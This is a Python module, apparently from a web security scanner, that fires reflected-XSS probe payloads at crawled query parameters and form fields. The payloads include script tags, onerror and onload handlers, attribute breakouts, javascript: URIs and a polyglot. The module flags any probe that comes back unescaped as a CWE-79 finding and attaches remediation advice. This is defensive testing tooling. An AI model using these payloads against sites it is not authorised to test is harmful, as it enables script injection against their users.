"""
Module 2 — Cross-Site Scripting (XSS) Agent

Sends real payloads for several distinct XSS technique families at every
discovered query-string parameter and form field, then inspects the *real*
response body to see whether the payload survives unescaped — i.e. whether
a browser would actually execute it. Each family targets a different
injection context so together they cover the common ways XSS slips through
partial sanitization.
"""
from __future__ import annotations

import uuid

from .http_client import request, build_evidence

# Each payload embeds a unique-ish canary so we can tell our own probe apart
# from content that was already on the page, and is tagged with the
# technique/context it targets.
def _payloads(canary):
    return [
        ("html_tag_injection", f"<script>/*{canary}*/alert(1)</script>"),
        ("event_handler_breakout", f"\"><img src=x onerror=alert('{canary}')>"),
        ("svg_onload", f"<svg onload=alert('{canary}')>"),
        ("attribute_breakout", f"' onmouseover=alert('{canary}') x='"),
        ("javascript_uri", f"javascript:alert('{canary}')"),
        ("polyglot", f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('{canary}') )//%0d%0a%0d%0a//</stYle/</titLe/</textarEa/</noscript/</template/{canary}"),
        ("tag_break_body", f"</textarea><script>alert('{canary}')</script>"),
        ("markdown_html_hint", f"<img src=\"x\" onerror=\"alert('{canary}')\">"),
    ]


def _looks_unescaped(body: str, payload: str) -> bool:
    if not body:
        return False
    # If the exact payload text is present verbatim, the templating layer
    # did not HTML-entity-encode it -> a browser would parse the markup/JS.
    return payload in body


def _test_param(session, url, method, param, other_params, base_time_note=""):
    findings = []
    canary = uuid.uuid4().hex[:8]
    for technique, payload in _payloads(canary):
        params = {**{p: "1" for p in other_params}, param: payload}
        if method == "GET":
            resp = request(session, "GET", url, params=params)
        else:
            resp = request(session, "POST", url, data=params)
        if not resp.get("ok"):
            continue
        if _looks_unescaped(resp.get("body", ""), payload):
            findings.append({
                "rule_id": f"XSS-{technique.upper()}",
                "title": f"Reflected XSS — {technique.replace('_', ' ')}",
                "cwe": "CWE-79",
                "severity": "high" if technique != "javascript_uri" else "medium",
                "param": param,
                "method": method,
                "url": url,
                "description": (
                    f"The parameter '{param}' on {method} {url} reflects an unescaped "
                    f"payload back into the HTML response ({technique.replace('_', ' ')} context), "
                    "meaning attacker-controlled markup/script would execute in a victim's browser."
                ),
                "recommendation": (
                    "Context-aware output encoding (HTML entity encode for body context, "
                    "attribute-encode for attribute context, JS-string-escape for inline JS) "
                    "and a strict Content-Security-Policy as defense in depth."
                ),
                "evidence": build_evidence(
                    f"{method} {url} ?{param}={payload!r}", resp,
                    note="Payload found verbatim (unescaped) in the response body."
                ),
            })
            break  # one confirmed technique per param is enough signal
    return findings


def run(session, target_report: dict, aggressive: bool = False) -> list:
    findings = []
    crawl = target_report.get("crawl", {})

    for qp in crawl.get("query_points", []):
        for param in qp["params"]:
            others = [p for p in qp["params"] if p != param]
            findings.extend(_test_param(session, qp["url"], "GET", param, others))

    for form in crawl.get("forms", []):
        text_inputs = [i["name"] for i in form["inputs"] if i["type"] in
                       ("text", "search", "email", "url", "textarea", "hidden", "")]
        for inp in text_inputs:
            others = [n for n in text_inputs if n != inp]
            findings.extend(_test_param(session, form["action"], form["method"], inp, others))

    return findings
